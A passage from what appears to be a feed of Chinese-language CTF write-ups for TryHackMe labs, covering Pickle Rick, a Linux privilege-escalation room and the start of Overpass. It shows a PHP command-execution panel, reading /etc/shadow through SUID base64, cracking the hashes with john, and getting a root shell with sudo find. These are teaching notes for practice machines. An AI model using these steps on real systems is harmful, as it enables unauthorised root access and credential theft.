punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token variable&#34;&gt;$output&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;shell_exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;command&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;/br&gt;&amp;lt;pre&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$output&lt;/span&gt;&lt;/span&gt;&amp;lt;/pre&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;这个是显示了 ban 了什么命令&lt;br /&gt;
+最后一串多层 base64  解出来是 rabbit hole...，没啥用 激动半天&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;2x01-flag1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2x01-flag1&#34;&gt;#&lt;/a&gt; 2x01 flag1&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;但是 Sup3rS3cretPickl3Ingred.txt 是我们的第一个 flag&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;3x01-flag2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3x01-flag2&#34;&gt;#&lt;/a&gt; 3x01 flag2&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;除此之外 clue.txt 给了剩下两个 flag 的线索&lt;br /&gt;
+ &amp;quot;Look around the file system for the other ingredient&amp;quot; 的翻译可以是 &amp;quot; 在文件系统中寻找其他的成分&lt;br /&gt;
+直接去找 /home 下或者 root 下的文件&lt;br /&gt;
+&lt;strong&gt;我是不会告诉你&lt;/strong&gt;我用了 nc msf 等想要打一个通道 方便操作反而浪费了二十分钟的事情，直接找吧.........&lt;br /&gt;
+ 在 /home/rick 下找到第二个成分&lt;br /&gt;
+&lt;strong&gt; second ingredients&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;4x01-提权又不像提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4x01-提权又不像提权&#34;&gt;#&lt;/a&gt; 4x01 提权又不像提权&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;其实第二个盲猜就在 root 下&lt;br /&gt;
+又扯到 linux 提权了  直接 sudo -l 先看看&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Matching Defaults entries &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; www-data on ip-10-10-151-49.eu-west-1.compute.internal:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    env_reset, mail_badpass, &lt;span class=&#34;token assign-left variable&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;:/usr/local/bin&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;:/usr/sbin&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;:/usr/bin&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;:/sbin&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;:/bin&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;:/snap/bin&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;User www-data may run the following commands on ip-10-10-151-49.eu-west-1.compute.internal:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ALL&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; NOPASSWD: ALL&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;咳咳 这还提个 damn 啊我就是自由的王 任意 遨游 看到 all 了吗？看到了吗？那是我驰骋江湖的名片啊.....&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;5x01-flag3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5x01-flag3&#34;&gt;#&lt;/a&gt; 5x01 flag3&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sudo ls /root&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/14/FPF7Lpp2.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+ 直接读了 sudo tac /root/3rd.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;6x01-总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6x01-总结&#34;&gt;#&lt;/a&gt; 6x01 总结&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;真的很简单没啥说的..........&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+&lt;h3 id=&#34;同时感兴趣的小伙伴可以多多关注我们团队哦&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同时感兴趣的小伙伴可以多多关注我们团队哦&#34;&gt;#&lt;/a&gt; 同时感兴趣的小伙伴可以多多关注我们团队哦！！！&lt;/h3&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/12/rj39LDE8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+</content>
+        <category term="小小简单靶场" />
+        <updated>2024-03-13T13:29:08.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/03/04/thm/</id>
+        <title>thm_Linux_Privilege_Escalation_Challenge</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/03/04/thm/"/>
+        <content type="html">&lt;p&gt;&lt;ul class=&#34;toc&#34;&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86&#34;&gt;信息收集&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#passwd%E6%8F%90%E6%9D%83&#34;&gt;passwd提权&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#sudo%E6%8F%90%E6%9D%83&#34;&gt;sudo提权&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#flag2txt&#34;&gt;flag2.txt&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/p&gt;
+&lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ssh 连接到 目标机器&lt;br /&gt;
+您可以通过浏览器访问目标计算机或使用下面的 SSH 凭据。&lt;br /&gt;
+&lt;strong&gt;Username:&lt;/strong&gt; leonard&lt;br /&gt;
+&lt;strong&gt;Password:&lt;/strong&gt; Penny123&lt;br /&gt;
+ 直接查看 suid 的可执行文件&lt;br /&gt;
+ find /  -perm -04000 2&amp;gt;/dev/null&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/base64&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/ksu&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/fusermount&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/passwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/gpasswd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/chage&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/newgrp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/staprun&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/chfn&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/su&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/chsh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/Xorg&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/mount&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/umount&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/crontab&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/pkexec&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/at&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/bin/sudo&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/pam_timestamp_check&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/unix_chkpwd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/usernetctl&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/userhelper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/sbin/mount.nfs&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/lib/polkit-1/polkit-agent-helper-1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/kde4/kpac_dhcp_helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/dbus-1/dbus-daemon-launch-helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/qemu-bridge-helper&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/krb5_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/ldap_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/selinux_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/sssd/proxy_child&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/usr/libexec/flatpak-bwrap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;/usr/bin/base64 带 suid 的 /usr/bin/base64 可以读取 /etc/passwd 和 /etc/shadow&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;passwd提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#passwd提权&#34;&gt;#&lt;/a&gt; passwd 提权&lt;/h1&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;base64 /etc/shadow &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; base64 &lt;span class=&#34;token parameter variable&#34;&gt;--decode&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;base64 /etc/passwd &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; base64 &lt;span class=&#34;token parameter variable&#34;&gt;--decode&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;读出来后分别保存在 1.txt 和 2.txt 中&lt;br /&gt;
+在攻击机器上 unshadow 1.txt 2.txt &amp;gt; 3&lt;br /&gt;
+ 直接 john 3 爆破&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://files.catbox.moe/ycbdfb.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
+但是无法爆破出 root 出来我们可以先登录到 missy 用户&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;sudo提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sudo提权&#34;&gt;#&lt;/a&gt; sudo 提权&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;登陆到 missy 先找一波 flag1.txt&lt;br /&gt;
+find / -name flag1.txt 2&amp;gt;/dev/null&lt;br /&gt;
+ 找到 /home/missy/Documents/flag1.txt&lt;br /&gt;
+ 再次进行信息收集 sudo -l 看看有什么执行文件有 sudo 权限&lt;br /&gt;
+ /usr/bin/find 只有一个 find 本来还想玩玩 LD_PRELOAD 但发现 没有这个 env_keep 可惜..........&lt;br /&gt;
+ 无所谓 find 命令照样提权&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-exec&lt;/span&gt; /bin/sh &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-quit&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;flag2txt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flag2txt&#34;&gt;#&lt;/a&gt; flag2.txt&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;root 权限下读取&lt;br /&gt;
+ /home/rootflag/flag2.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="linux提权" />
+        <category term="tryhackme" />
+        <updated>2024-03-04T13:24:08.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/02/01/tryhackme-overpass-wp/</id>
+        <title>Tryhackme-Overpass-wp</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/02/01/tryhackme-overpass-wp/"/>
+        <content type="html">&lt;p&gt;&lt;ul class=&#34;toc&#34;&gt;
+&lt;li&gt;&lt;a href=&#34;#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B&#34;&gt;主机信息探测&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#web%E6%9E%9A%E4%B8%BE&#34;&gt;web枚举&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81cookie%E6%9B%B4%E6%94%B9&#34;&gt;身份验证cookie更改&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#ssh%E8%BF%9E%E6%8E%A5&#34;&gt;ssh连接&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87&#34;&gt;权限提升&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%80%9D%E8%B7%AF&#34;&gt;思路&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E6%80%BB%E7%BB%93&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Tryhackme-Overpass-wp&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;hello 大家今天是一波 thm 的 overpass 靶场的 wp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;主机信息探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主机信息探测&#34;&gt;#&lt;/a&gt; 主机信息探测&lt;/h1&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/MQwmwDJP.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;从 80 端口找 web 漏洞或者 ssh 爆破，但是 ssh 爆破难度太大，先看 web&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;web枚举&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web枚举&#34;&gt;#&lt;/a&gt; web 枚举&lt;/h1&gt;
+&lt;blockquote&gt;&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/02/01/3TYWDkvN.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;找到 admin 目录  可能有身份验证损坏让我们登陆到后台&lt;br /&gt;
+之后根据提示不用暴力破解 则看到了 login.js&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;身份验证cookie更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#身份验证cookie更改&#34;&gt;#&lt;/a&gt; 身份验证 cookie 更改&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;login.js&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; usernameBox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; passwordBox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; loginStatus &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;querySelector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#loginStatus&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    loginStatus&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;textContent &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; creds &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; usernameBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token literal-property property&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; passwordBox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value &lt;span class=&#34;token 